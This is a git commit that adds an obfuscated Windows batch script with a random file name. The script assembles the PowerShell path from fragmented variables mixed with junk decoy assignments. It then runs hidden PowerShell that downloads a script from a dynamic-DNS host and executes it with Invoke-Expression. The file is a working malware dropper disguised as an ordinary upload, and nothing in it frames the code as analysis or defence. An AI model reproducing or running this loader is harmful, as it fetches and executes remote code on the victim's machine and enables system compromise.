2440eac58791413bd64d8db28470970ade1faa93
digital2710 <73541765+digital2710@users.noreply.github.com>
2020-10-29 09:10:38 -0300

    Add files via upload

---
+++ _G9V7B4X8C3_.cmd
@@ -0,0 +1,45 @@
+@echo off
+cd %SystemRoot%\System32
+set q=C0t1_4_9W8_7u7ojrjECBGDj
+set r=_4_1i3c8c0j4_4cxVczmPUsG
+set s=_0E3a9d1_9D6a8BskFfURhUg
+set t=_6_3C9_3_4q1U9ixPBZeaDsP
+set u=_9q5p4_1_8_2t2PvYpGHdHDl
+set v=c5j5O2a5f3n8_6NBkkYwCDhf
+set x=_6_3_6N9n0_0b7fOmXhOeYlT
+set y=O3J9_8W8_5M7_1KhfaLGupaU
+set z=_2n3f2a4y4d8r4SeVhKjYPEY
+set a=Win
+set za=l0l2u7_5_1_0_5LYTVjTUgvd
+set b=dow
+set ze=_0_6_1_0_8n3u0CrZhArbPrc
+set c=sPo
+set ze=s0J0_9s7X1A2Z7nyCBTIRoFl
+set d=wer
+set ze=_7_4i8N1_7J6_9KVLFrITsPJ
+set e=She
+set ze=_4_8_3_9_1B8_5fBRkxoWaZZ
+set f=ll\
+set ze=r9_3Z6c5_9Y2m1AbFqlCVkRt
+set g=v1.
+set ze=F7_1i7H8L4_3l0dVtsRhnyNh
+set h=0\po
+set ze=P1D0_8_6_0w1_5hPnPfeTeiU
+set i=we
+set ze=_2_6V0_3_9m6_6WyhcEDaOzK
+set j=rsh
+set ze=_1y5_1_5L6G5u1BVkkXShuEV
+set k=ell
+set ze=j1_8s6w0O0_8N9YneHFcuogn
+set l=.ex
+set ze=r7R3N9U3a1_8_8iTzBheBqBV
+set m=e -n
+set ze=r4D8y2_8a2u3l7bbxjjsFoky
+set n=op 
+set ze=_5C2_7_5_0_9D8ABaKWuvsfs
+set o=-w
+set ze=_5n2_6i6_8V9M5IanObvMmaz
+set p=in 1 -
+set ze=_8D1_1_7_5h2i4CpCBTzGfEw
+echo ieX("Ie`X`(N`ew-oBJ`e`Ct N`et.`Web`ClIeNt`).DOwnlOa`d`StRIN`G('http://fvsual.bounceme.net/_7_0_3l3F4_2_9fbhmx/_7_0_3l3F4_2_9fbh/_7_0_3l3F4_2_9fbhal/_7_0_3l3F4_2_9fbh')"); | %a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l%%m%%n%%o%%p%
+set ze=_8_1_3k3_4_0_0SvAbiIwXwi
